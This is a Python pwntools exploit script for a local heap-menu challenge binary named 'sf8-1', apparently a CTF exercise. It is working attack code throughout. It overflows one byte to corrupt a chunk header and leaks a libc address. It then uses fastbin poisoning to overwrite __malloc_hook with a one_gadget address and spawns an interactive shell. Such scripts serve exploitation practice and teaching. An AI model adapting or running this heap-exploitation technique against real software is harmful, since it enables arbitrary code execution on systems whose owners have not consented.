from pwn import *

p = process("./sf8-1")
# elf = 

# context.log_level = 'debug'

one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

def allocate(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def fill(index, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def free(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))    

def dump(index):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Content: \n")

allocate(0x18)
allocate(0x80)  #mm
allocate(0x10)
allocate(0x60)
free(1)
# input()

fill(0, 0x19, b'A'*0x18 + b'\x93')

allocate(0x80)
# input()
dump(1)  # fd out

leak = u64(p.recv(8))
print(hex(leak))
malloc_hook = leak - 0x68
libc_base = leak - 0x3c4b78

print(hex(libc_base))

#------------------------

free(3)

pay = b''
pay += p64(0)*3 + p64(0x71) 
pay += p64(malloc_hook - 0x30 + 0x8 + 0x5) # -> 7f 

fill(2, 0x28, pay)

allocate(0x60)
allocate(0x60)

pay = b''
pay += b'\x00'*0x13
pay += p64(libc_base + one[1])

fill(4, 0x13 + 0x8, pay)

print(hex(malloc_hook))

# alloc(0x10)
input()

allocate(0x60)

p.interactive()
